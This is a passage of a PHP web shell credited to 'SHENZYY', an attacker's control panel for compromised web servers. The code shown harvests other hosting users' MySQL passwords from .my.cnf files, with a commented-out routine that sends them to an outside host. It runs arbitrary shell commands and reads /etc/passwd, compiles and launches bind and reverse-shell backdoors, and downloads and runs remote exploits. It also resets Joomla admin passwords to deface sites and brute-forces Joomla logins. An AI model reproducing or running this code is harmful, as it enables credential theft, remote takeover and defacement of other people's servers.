echo "<li> <a href='?dir=$dir&do=whmcsdecod'>WHMCS Decoder</a></li>";
echo "<li> <a href='?dir=$dir&do=dbdump'>DB Dump</a> </li>";
echo "<li> <a href='?dir=$dir&do=code'>Inject Code</a> </li><br><br>";
echo "<li> <a href='?dir=$dir&do=jbrute'>BruteForce Joomla</a></li>";
echo "<li> <a href='?dir=$dir&do=wpbrute'>BruteForce Wordpress</a></li>";
echo "<li> <a href='?dir=$dir&do=fb'>BruteForce Facebook</a></li>";
echo "<li> <a href='?dir=$dir&do=emailbrute'>BruteForce Email</a></li>";
echo "<li> <a href='?dir=$dir&do=twitterbf'>BruteForce Twitter</a></li><br><br>";
echo "<li> <a href='?dir=$dir&do=auto_edit_user'>Mass User Changer</a> </li>";
echo "<li> <a href='?dir=$dir&do=title'>Mass Title Changer</a> </li>";
echo "<li> <a href='?dir=$dir&do=sqli-scanner'>SQLi Scanner</a></li>";
echo "<li> <a href='?dir=$dir&do=ports'>Port Scanner</a></li>";
echo "<li> <a href='?dir=$dir&do=cmsvuln'>CMS Vulnerability Scanner</a></li><br><br>";
echo "<li> <a href='?dir=$dir&do=string'>Encode/Decode</a> </li>";
echo "<li> <a href='?dir=$dir&do=hashid'>HashID</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Generate</a> </li>";
echo "<li> <a href='?dir=$dir&do=domains'>Domains Viewer</a></li>";
echo "<li> <a href='?dir=$dir&do=reverse'>ReverseIP</a> </li>";
echo "<li> <a href='?dir=$dir&do=ddosattack'>DDOS</a> </li>";
echo "<li> <a href='?dir=$dir&do=adfin'>Admin Finder</a></li><br><br>";
echo "<li> <a href='?dir=$dir&do=bypass-cf'>Bypass CloudFlare</a></li>";
echo "<li> <a href='?dir=$dir&do=bypassserver'>Bypass Server</a></li>";
echo "<li> <a href='?dir=$dir&do=vhost'>Bypass vHost</a> </li>";
echo "<li> <a href='?dir=$dir&do=passwbypass'>Bypass Etc/Passwd</a> </li>";
echo "<li> <a href='?dir=$dir&do=cpftp_auto'>Bomb Mailer</a></li><br><br>";
echo "<li> <a href='?dir=$dir&do=zip'>Zip Menu</a></li>";
echo "<li> <a href='?dir=$dir&do=phpinfo'>PHP Info</a></li>";
echo "<li> <a href='?dir=$dir&do=loghunter'>Log Hunter</a></li>";
echo "<li> <a href='?dir=$dir&do=logs'>Delete Logs</a></li>";
echo "<li> <a href='?dir=$dir&do=contact'>Contact Me</a></li>";
echo "<li> <a href='?dir=$dir&do=about'>About Me</a></li><br><br>";
echo "<li> <a href='?shell&do=kill'>KillSelf</a></li> ";
echo "<li> <a href='?byee&do=logout' style='color:red;'> Logout</a></li> ";

echo "</ul>";
echo "</center>";
echo "<hr color='red'>";
echo "</div>";
echo "<br>";
echo "<center>";
echo "Current DIR: ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo "[ ".w($dir, perms($dir))." ]";
echo "<br>";
echo "<br>";

	if($_GET['do'] == 'grabcpanel') {
@ini_set('display_errors',0);
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}
echo '<br><br><style>
textarea {
resize:none;
color:black;
background-color:#ffffff;  
font-size:8pt; color:black;
border:1px solid white ;
border-left: 4px solid white ;
}
input {
color: black;
border:1px dotted white;
}
</style>';
echo '<center>';
$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");
if ($domains or $d0mains)
{
    $domains = scandir("/var/named");
    if($domains) {
echo "<table align=center><tr><th valign=top  class=style2> COUNT </th><th valign=top > DOMAIN </th><th valign=top class=style2 > USER </th><th valign=top class=style2 > Password </th><th valign=top class=style2 > .my.cnf </th></tr>";
$count=1;
$dc = 0;
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dirz = '/home/'.$owner['name'].'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
$p=file_get_contents(''.$path.'/'.$owner['name'].'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td valign=top style=border :2px solid white; width: 139px class=style2>".$count++."</td><td valign=top style= width: 139px; border :2px solid white  class=style2 ><a href=http://".$domain.":2082 target=_blank>".$domain."</a></td><td valign=top style= width: 139px; border: 2px solid white  class=style2 >".$owner['name']."</td><td valign=top style= width: 139px; border: 2px solid white  class=style2 >".$password."</td><td valign=top style=border :2px solid white style=width: 139px><a href=".$owner['name'].".txt target=_blank>Click Here</a></td></tr>";
$dc++;
$success3="http://".$domain."|".$owner['name']."|".$password."\n";
//For my friend SHENZYY
/*
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"http://ww3s.ws/ok.php");
curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 5.1; rv:18.0) Gecko/20100101 Firefox/18.0');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"result=".base64_encode($success3));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_HEADER, 1);
$buffer = curl_exec($ch);
*/
}
}
}
echo '</table>';
$total = $dc;
 
echo '</center>';
}else{
$d0mains = @file('/etc/named.conf');
    if($d0mains) {
echo "<table align=center><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
$count=1;
$dc = 0;
$mck = array();
foreach($d0mains as $d0main){
    if(@eregi('zone',$d0main)){
        preg_match_all('#zone "(.*)"#',$d0main,$domain);
        flush();
        if(strlen(trim($domain[1][0])) >2){
            $mck[] = $domain[1][0];
        }
    }
}
$mck = array_unique($mck);
$usr = array();
$dmn = array();
foreach($mck as $o) {
    $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
    $usr[] = $infos['name'];
    $dmn[] = $o;
}
array_multisort($usr,$dmn);
$dt = file('/etc/passwd');
$passwd = array();
foreach($dt as $d) {
    $r = explode(':',$d);
    if(strpos($r[5],'home')) {
        $passwd[$r[0]] = $r[5];
    }
}
$l=0;
$j=1;
foreach($usr as $r) {
$dirz = '/home/'.$r.'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$r.'.txt');
$p=file_get_contents(''.$path.'/'.$r.'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td valign=top class=style2 style=width: 139px>".$count++."</td><td valign=top class=style2 style=width: 139px><a target=_blank href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td><td valign=top class=style2 style=width: 139px>'.$r."</td><td valign=top class=style2 style=width: 139px>".$password."</td><td valign=top class=style2 style=width: 139px><a href='".$r.".txt' target='_blank'>Click Here</a></td></tr>";
$dc++;
                flush();
                $l=$l?0:1;
                $j++;
                }
            }
            }
echo '</table>';
$total = $dc;
echo '<br><div class=result valign=top class=style2 style=width: 139px >Total cPanel Found = '.$total.'</h3><br />';
echo '</center>';
}
 
}else{
echo "<div class=result><i><font color=#FF0000>ERROR</font><br><font color=#FF0000>/var/named</font> or <font color=#FF0000>etc/named.conf</font> Not Accessible!</i></div>";
}
}
elseif($_GET['do'] == 'bypassserver') { 
?>
        <form action="?dir=<?php echo $pwd; ?>&amp;do=bypassserver" method="post">
            <center /><br /><b>
                <font color=white>-=[ Command Bypass Exploit By SHENZYY ]=-</font>
            </b><br>
            <?php
print_r('
<pre>
<form method="POST" action="">
<b><font color=white><b><font color="white">Command </font></font></b><input name="baba" type="text" class="inputz" size="34">&nbsp;<input type="submit" class="inputzbut" value="Go">
</form>
<form method="POST" action=""><strong><b><font color="white">Menu Bypass</font></strong><select name="liz0" size="1" class="inputz">
<option value="cat /etc/passwd">/etc/passwd</option>
<option value="netstat -an | grep -i listen">netstat</option>
<option value="cat /var/cpanel/accounting.log">/var/cpanel/accounting.log</option>
<option value="cat /etc/syslog.conf">/etc/syslog.conf</option>
<option value="cat /etc/hosts">/etc/hosts</option>
<option value="cat /etc/named.conf">/etc/named.conf</option>
<option value="cat /etc/httpd/conf/httpd.conf">/etc/httpd/conf/httpd.conf</option>
</select> <input type="submit" class="inputzbut" value="G&ouml;">
</form>
</pre>
');
ini_restore("safe_mode");
ini_restore("open_basedir");
$liz0=shell_exec($_POST[baba]); 
$liz0zim=shell_exec($_POST[liz0]); 
$uid=shell_exec('id');
$server=shell_exec('uname -a');
echo "<pre><h4>";

echo $liz0;
echo $liz0zim;
echo "</h4></pre>";
 "</div>"; 
 ?>
            <?php }

elseif($_GET['do'] == 'bypass-cf'){	
echo '
<form method="POST"><br><br>
<center><p align="center" dir="ltr"><b><font size="5" face="Tahoma">+--=[ Bypass CloudFlare By SHENZYY ]=--+
</font></b></p>
<select class="inputz" name="krz">
	<option>ftp</option>
		<option>direct-conntect</option>
			<option>webmail</option>
				<option>cpanel</option>
</select>
<input class="inputz" type="text" name="target" value="url">
<input class="inputzbut" type="submit" value="Bypass"></center>

';

$target = $_POST['target'];
# Bypass From FTP
if($_POST['krz'] == "ftp") {
$ftp = gethostbyname("ftp."."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$ftp</font></p>";
} 
# Bypass From Direct-Connect
if($_POST['krz'] == "direct-conntect") {
$direct = gethostbyname("direct-connect."."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$direct</font></p>";
}
# Bypass From Webmail
if($_POST['krz'] == "webmail") {
$web = gethostbyname("webmail."."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$web</font></p>";
}
# Bypass From Cpanel
if($_POST['krz'] == "cpanel") {
$cpanel = gethostbyname("cpanel."."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$cpanel</font></p>";
}
}

elseif($_GET['do'] == 'netsploit'){ 

// bind connect with c
if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) {
	$port = trim($_POST['port']);
	$passwrd = trim($_POST['bind_pass']);
	tulis("bdc.c",$port_bind_bd_c);
 	exe("gcc -o bdc bdc.c");
 	exe("chmod 777 bdc");
 	@unlink("bdc.c");
 	exe("./bdc ".$port." ".$passwrd." &");
 	$scan = exe("ps aux"); 
	if(eregi("./bdc $por",$scan)){ $msg = "<p>Process found running, backdoor setup successfully.</p>"; }
	else { $msg =  "<p>Process not found running, backdoor not setup successfully.</p>"; }
}
// bind connect with perl
elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) {
	$port = trim($_POST['port']);
	$passwrd = trim($_POST['bind_pass']);
	tulis("bdp",$port_bind_bd_pl);
	exe("chmod 777 bdp");
 	$p2=which("perl");
 	exe($p2." bdp ".$port." &");
 	$scan = exe("ps aux"); 
	if(eregi("$p2 bdp $port",$scan)){ $msg = "<p>Process found running, backdoor setup successfully.</p>"; }
	else { $msg = "<p>Process not found running, backdoor not setup successfully.</p>"; }
}
// back connect with c
elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'C')) {
	$ip = trim($_POST['ip']);
	$port = trim($_POST['backport']);
	tulis("bcc.c",$back_connect_c);
 	exe("gcc -o bcc bcc.c");
 	exe("chmod 777 bcc");
 	@unlink("bcc.c");
	exe("./bcc ".$ip." ".$port." &");
	$msg = "Now script try connect to ".$ip." port ".$port." ...";
}
// back connect with perl
elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'Perl')) {
	$ip = trim($_POST['ip']);
	$port = trim($_POST['backport']);
	tulis("bcp",$back_connect);
	exe("chmod +x bcp");
	$p2=which("perl");
 	exe($p2." bcp ".$ip." ".$port." &");
 	$msg = "Now script try connect to ".$ip." port ".$port." ...";
}
elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['wcmd']))
{
	$pilihan = trim($_POST['pilihan']);
	$wurl = trim($_POST['wurl']);
	$namafile = download($pilihan,$wurl);
	if(is_file($namafile)) {
	
	$msg = exe($wcmd);
	}
	else $msg = "error: file not found $namafile";
}

?>
            <table class="tabnet">
                <tr>
                    <th>Port Binding</th>
                    <th>Connect Back</th>
                    <th>Load and Exploit</th>
                </tr>
                <tr>
                    <td>
                        <table>
                            <form method="post" action="?dir=<?php echo $pwd; ?>&amp;do=netsploit">
                                <tr>
                                    <td>Port <br><br><br>Pass<br><br><br><br><br></td>
                                    <td><input class="inputz" type="text" name="port" size="26" value="<?php echo $bindport ?>"><br><br><input class="inputz" type="text" name="bind_pass" size="26" value="<?php echo $bindport_pass; ?>"><br><select class="inputz" size="1" name="use">
                                            <option value="Perl">Perl</option>
                                            <option value="C">C</option>
                                        </select><br><input class="inputzbut" type="submit" name="bind" value="Bind" style="width:80px"></td>
                                </tr>
                            </form>
                        </table>
                    </td>
                    <td>
                        <table>
                            <form method="post" action="?dir=<?php echo $pwd; ?>&amp;do=netsploit">
                                <tr>
                                    <td>IP<br><br><br>Port<br><br><br><br><br></td>
                                    <td><input class="inputz" type="text" name="ip" size="26" value="<?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")); ?>"><br><br><input class="inputz" type="text" name="backport" size="26" value="<?php echo $bindport; ?>"><br><select size="1" class="inputz" name="use">
                                            <option value="Perl">Perl</option>
                                            <option value="C">C</option>
                                        </select><br><input type="submit" name="backconn" value="Connect" class="inputzbut" style="width:80px"></td>
                                </tr>
                                
                            </form>
                        </table>
                    </td>
                    <td>
                        <table>
                            <form method="post" action="?dir=<?php echo $pwd; ?>&amp;do=netsploit">
                                <tr>
                                    <td>url<br><br><br>cmd<br><br><br><br><br></td>
                                    <td><input class="inputz" type="text" name="wurl" style="width:180px;" value="www.some-code/exploits.c"><br><br><input class="inputz" type="text" name="wcmd" style="width:180px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"><br><select size="1" class="inputz" name="pilihan">
                                            <option value="wwget">wget</option>
                                            <option value="wlynx">lynx</option>
                                            <option value="wfread">fread</option>
                                            <option value="wfetch">fetch</option>
                                            <option value="wlinks">links</option>
                                            <option value="wget">GET</option>
                                            <option value="wcurl">curl</option>
                                        </select><br><input type="submit" name="expcompile" class="inputzbut" value="Go" style="width:80px;"></td>
                                </tr>
                            </form>
                        </table>
                    </td>
                </tr>
            </table>
            <div style="text-align:center;margin:2px;"><?php echo $msg; ?></div>
            <?php } 

elseif($_GET['do'] == 'jodexer'){	
?>
            <form action="?dir=<?php echo $pwd; ?>&amp;do=jodexer" method="post">
                
                <?php

function randomt() {
    
        $chars = "abcdefghijkmnopqrstuvwxyz023456789";
        srand((double)microtime()*1000000);
        $i = 0;
        $pass = '' ;
    
        while ($i <= 7) {
            $num = rand() % 33;
            $tmp = substr($chars, $num, 1);
            $pass = $pass . $tmp;
            $i++;
        }
    
        return $pass;
    
    }
    function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1)
    {
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    $ar=trim($ar1[0]);
    return $ar;
    }
    if ($_POST['form_action'])
    {
    
    $text=file_get_contents($_POST['file']);
    $username=entre2v2($text,"public $user = '","';");
    $password=entre2v2($text,"public $password = ', '","';");
    $dbname=entre2v2($text,"public $db = ', '","';");
    $dbprefix=entre2v2($text,"public $dbprefix = '","';");
    $site_url=($_POST['site_url']);
    
    $h="<? echo(stripslashes(base64_decode('".urlencode(base64_encode(str_replace("'","'",($_POST['code']))))."'))); exit; ?>";
                
                $co=randomt();
                /*
                echo($username);
                echo("<br>");
                echo($password);
                echo("<br>");
                echo($dbname);
                echo("<br>");
                echo($dbprefix);
                echo("<br>");
                */
                $co=randomt();
                
                if ($_POST['form_action'])
                {
                $h="<? echo(stripslashes(base64_decode('".urlencode(base64_encode(str_replace("'","'",($_POST['code']))))."'))); exit; ?>";
                
                
                
                
                
                $link=mysql_connect("dzoed.druknet.bt",$username,$password) ;
                
                mysql_select_db($dbname,$link) ;
                
                $tryChaningInfo = mysql_query("UPDATE ".$dbprefix."users SET username ='admin' , password = '2a9336f7666f9f474b7a8f67b48de527:DiWqRBR1thTQa2SvBsDqsUENrKOmZtAX'");
                echo("<br>[+] Changing admin password to 123456789");
                
                $req =mysql_query("SELECT * from `".$dbprefix."extensions` ");
                
                if ( $req )
                {
                #################################################################
                ###################### V1.6 ######################
                #################################################################
                
                
                $req =mysql_query("SELECT * from `".$dbprefix."template_styles` WHERE client_id='0' and home='1'");
                $data = mysql_fetch_array($req);
                $template_name=$data["template"];
                
                $req =mysql_query("SELECT * from `".$dbprefix."extensions` WHERE name='".$template_name."'");
                $data = mysql_fetch_array($req);
                $template_id=$data["extension_id"];
                
                $url2=$site_url."/index.php";
                
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url2);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
                curl_setopt($ch, CURLOPT_HEADER, 1);
                curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
                
                
                $buffer = curl_exec($ch);
                
                $return=entre2v2($buffer ,'<input type="hidden" name="return" value="','"');
    $hidden=entre2v2($buffer ,' <input type="hidden" name="','" value="1"',4);
    
    ///////////////////////////
    $url2=$site_url."/index.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"username=admin&passwd=123456789&option=com_login&task=login&return=".$return."&".$hidden."=1");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $pos = strpos($buffer,"com_config");
    if($pos === false) {
    echo("<br>[-] Login Error");
    exit;
    }
    else {
    echo("<br>[~] Login Successful");
    }
    ///////////////////////////
    $url2=$site_url."/index.php?option=com_templates&task=source.edit&id=".base64_encode($template_id.":index.php");
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $hidden2=entre2v2($buffer ,' <input type="hidden" name="','" value="1"',2);
    if($hidden2) {
    echo("<br>[+] index.php file founded in Theme Editor");
    }
    else {
    echo("<br>[-] index.php Not found in Theme Editor");
    exit;
    }
    echo("<br>[*] Updating Index.php .....");
    $url2=$site_url."/index.php?option=com_templates&layout=edit";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"jform[source]=".$h."&jform[filename]=index.php&jform[extension_id]=".$template_id."&".$hidden2."=1&task=source.save");
    
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $pos = strpos($buffer,' <dd class="message message">');
                if($pos === false) {
                echo("<br>[-] Updating Index.php Error");
                exit;
                }
                else {
                echo("<br>[~] index.php successfully saved");
                }
                #################################################################
                ###################### V1.6 END ######################
                #################################################################
                
                
                }
                else
                {
                
                #################################################################
                ###################### V1.5 ######################
                #################################################################
                
                $req =mysql_query("SELECT * from `".$dbprefix."templates_menu` WHERE client_id='0'");
                $data = mysql_fetch_array($req);
                $template_name=$data["template"];
                
                $url2=$site_url."/index.php";
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url2);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
                curl_setopt($ch, CURLOPT_HEADER, 1);
                curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
                $buffer = curl_exec($ch);
                
                $hidden=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',3);
    
    $url2=$site_url."/index.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"username=admin&passwd=123456789&option=com_login&task=login&".$hidden."=1");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $pos = strpos($buffer,"com_config");
    
    if($pos === false) {
    echo("<br>[-] Login Error");
    exit;
    }
    else {
    echo("<br>[+] Login Successful");
    }
    ///////////////////////////
    $url2=$site_url."/index.php?option=com_templates&task=edit_source&client=0&id=".$template_name;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $hidden2=entre2v2($buffer ,' <input type="hidden" name="','" value="1"',6);
    
    if($hidden2) {
    echo("<br>[~] index.php file founded in Theme Editor");
    }
    else {
    echo("<br>[-] index.php Not found in Theme Editor");
    }
    
    echo("<br>[*] Updating Index.php .....");
    $url2=$site_url."/index.php?option=com_templates&layout=edit";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"filecontent=".$h."&id=".$template_name."&cid[]=".$template_name."&".$hidden2."=1&task=save_source&client=0");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $pos = strpos($buffer,' <dd class="message message fade">');
                if($pos === false) {
                echo("<br>[-] Updating Index.php Error");
                exit;
                }
                else {
                echo("<br>[~] index.php successfully saved");
                }
                #################################################################
                ###################### V1.5 END ######################
                #################################################################
                
                }
                
                }
                
                
                function randomt() {
                
                $chars = "abcdefghijkmnopqrstuvwxyz023456789";
                srand((double)microtime()*1000000);
                $i = 0;
                $pass = '' ;
                
                while ($i <= 7) { $num=rand() % 33; $tmp=substr($chars, $num, 1); $pass=$pass . $tmp; $i++; } return $pass; } function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1) { $ar0=explode($marqueurDebutLien, $text); $ar1=explode($marqueurFinLien, $ar0[$i]); $ar=trim($ar1[0]); return $ar; } }?>
                    <center><br><br>
                        <font color="white" size='+3'><b>+--=[ Automatic Joomla Index Changer By SHENZYY ]=--+</b></font><br><br>
                    </center>
                    <center><b>
                            Link of symlink configuration.php of Joomla<br></b>
                        <FORM action="" method="post">
                            <input type="hidden" name="form_action" value="1">
                            <input type="text" class="inputz" size="60" name="file" value="http://site.com/sym/home/user/public_html/configuration.php">
                            <br>
                            <br><b>
                                Admin Control panel url</b><br>
                            <input type="text" class="inputz" size="40" name="site_url" value="http://site/administrator"><br>
                            <br><b>
                                Your Index Code</b>
                            <br>
                            <TEXTAREA rows="20" align="center" style="background:black" cols="120" name="code"> your index code
            </TEXTAREA>
                            <br>
                            <INPUT class="inputzbut" type="submit" value="Lets Go Deface !!!" name="Submit">
                        </FORM>
                    </center>
                    <script language=JavaScript>
                    m = '%09%09%09%09%09%09%09%3C/td%3E%0A%09%09%09%09%09%09%3C/tr%3E%0A%09%09%09%09%09%3C/table%3E%0A%09%09%09%09%3C/td%3E%0A%3C/html%3E';
                    d = unescape(m);
                    document.write(d);
                    
                    </script>
                    <?php
}
elseif($_GET['do'] == 'jbrute'){ 
?>
                    <form action="?dir=<?php echo $pwd; ?>&amp;do=jbrute" method="post">
                        
                        <meta name="author" content="SHENZYY" />
                        <meta name="keywords" content="Joomla, Bruter, JoomlaBruter, JoomlaBruterForce, JoomlaBruterForceOnline" />
                        <meta name="description" content="SHENZYY" />
                        <center>
                            </br></br>
                            <center><b>
                                    <font color="lime">+--=[ Joomla Brute Force By SHENZYY ]=--+</font>
                                </b><br /><br />
                                <form method="post" action="" enctype="multipart/form-data">
                                    <table class="tabnet" width="38%" border="0">
                                        <center>
                                            <th colspan="2">Joomla Brute Force</th>
                                            <tr>
                                                <td>
                                                    <p>
                                                        <font class="d1">User :</font>
                                                        </th>
                                                        <input class="inputz" type='text' name="usr" value="admin" size="15"> </font>
                                        </center><br /><br /></p>
                                        </td>
                                        </tr>
                                        <tr>
                                            <td>
                                                <font class="">Sites list :</font>
                                            </td>
                                            <td>
                                                <font class="">Pass list :</font>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>
                                                <textarea name="sites" style="background:black;" cols="40" rows="13"></textarea>
                                            </td>
                                            <td>
                                                <textarea name="w0rds" style="background:black;" cols="40" rows="13">
admin
123456
password
102030
123123
12345
123456789
pass
test
admin123
demo
!@#$%^
</textarea>
                                            </td>
                                        </tr>
                                        <center>
                                            <tr>
                                                <td>
                                                    <font>
                                                        <input class="inputzbut" type="submit" name="x" value="start" id="d4">
                                                    </font>
                                                </td>
                                            </tr><br>
                                            Greetz : All Indonesian Hackers <br>
                                        </center>
                                    </table>
                                </form>
                            </center>
                            <?php
@set_time_limit(0); 
if($_POST['x']){ 

echo "<hr>"; 

$sites = explode("\n",$_POST["sites"]); // Get Sites 
$w0rds = explode("\n",$_POST["w0rds"]); // Get w0rdLiSt 

$Attack = new Joomla_brute_Force(); // Active Class 


foreach($w0rds as $pwd){ 

foreach($sites as $site){ 


$Attack->check_it(txt_cln($site),$_POST['usr'],txt_cln($pwd)); // Brute :D 
flush();flush(); 

} 

} 

} 


# Class & Function'z 

function txt_cln($value){  return str_replace(array("\n","\r"),"",$value); } 

class Joomla_brute_Force{ 

public function check_it($site,$user,$pass){ // print result 

if(eregi('com_config',$this->post($site,$user,$pass))){ 

echo "<span class=\"x2\"><b># Success : $user:$pass -> <a href='$site/administrator/index.php'>$site/administrator/index.php</a></b></span><BR>";
$f = fopen("Result.txt","a+"); fwrite($f , "Success ~~ $user:$pass -> $site/administrator/index.php\n"); fclose($f); 
flush(); 
}else{ echo "# Failed : $user:$pass -> $site<BR>"; flush();} 

} 

public function post($site,$user,$pass){ // Post -> user & pass 

$token = $this->extract_token($site); 

$curl=curl_init(); 

curl_setopt($curl,CURLOPT_RETURNTRANSFER,1); 
curl_setopt($curl,CURLOPT_URL,$site."/administrator/index.php"); 
@curl_setopt($curl,CURLOPT_COOKIEFILE,'cookie.txt'); 
@curl_setopt($curl,CURLOPT_COOKIEJAR,'cookie.txt'); 
curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gecko/2008111317  Firefox/3.0.4'); 
@curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1); 
curl_setopt($curl,CURLOPT_POST,1); 
curl_setopt($curl,CURLOPT_POSTFIELDS,'username='.$user.'&passwd='.$pass.'&lang=en-GB&option=com_login&task=login&'.$token.'=1'); 
curl_setopt($curl,CURLOPT_TIMEOUT,20); 

$exec=curl_exec($curl); 
curl_close($curl); 
return $exec; 

} 

public function extract_token($site){ // get token from source for -> function post 

$source = $this->get_source($site); 

preg_match_all("/type=\"hidden\" name=\"([0-9a-f]{32})\" value=\"1\"/si" ,$source,$token); 

return $token[1][0]; 

} 

public function get_source($site){ // get source for -> function extract_token 

